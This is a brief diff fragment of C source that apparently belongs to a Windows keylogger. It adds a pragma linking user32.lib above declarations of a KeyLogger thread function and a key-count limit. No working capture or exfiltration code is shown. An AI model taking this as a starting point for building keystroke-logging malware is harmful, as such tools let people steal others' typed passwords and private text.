@@ -3,6 +3,7 @@
 #include <stdio.h>
 #include <stdbool.h>
 #include "log.h"
+#pragma comment(lib,"user32.lib") 
 #define LIMITE_TECLAS 5
 int iniciaThread(char* argv[]);
 DWORD WINAPI KeyLogger(LPVOID lpParameter);
